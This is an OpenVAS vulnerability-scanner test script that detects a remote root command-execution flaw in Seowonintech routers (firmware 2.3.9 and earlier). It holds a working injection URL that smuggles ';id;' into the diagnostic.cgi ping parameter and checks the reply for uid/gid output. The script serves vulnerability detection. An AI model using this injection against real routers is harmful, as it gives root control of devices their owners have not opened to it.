###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_multiple_seowonintech_devices_rce_06_13.nasl 11 2013-10-27 10:12:02Z jan $
#
# Seowonintech Routers Remote Root Command Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "The remote Seowonintech Router is prone to a remote root command-execution vulnerability.

Remote attackers can exploit this issue to execute arbitrary commands
within the context of root.

Seowonintech Router Firmware <= 2.3.9 is vulnerable; other versions may also be affected.";


tag_solution = "Ask the vendor for an Update.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103745";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 11 $");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

 script_name("Seowonintech Routers Remote Root Command Execution Vulnerability");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name:"URL", value:"http://packetstormsecurity.com/files/122126/Seowonintech-Remote-Root.html");
 
 script_tag(name:"risk_factor", value:"Critical");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-06-24 12:51:39 +0200 (Mon, 24 Jun 2013)");
 script_description(desc);
 script_summary("Determine if it is possible to execute the id command");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port:port);

if("Server: thttpd/2" >!< banner)exit(0);

url = '/cgi-bin/diagnostic.cgi?select_mode_ping=on&ping_ipaddr=-q%20-s%200%20127.0.0.1;id;&ping_count=1&action=Apply&html_view=ping ';

if(http_vuln_check(port:port, url:url,pattern:"uid=[0-9]+.*gid=[0-9]+",check_header:TRUE)) {

  security_hole(port:port);
  exit(0);

}  

exit(0);
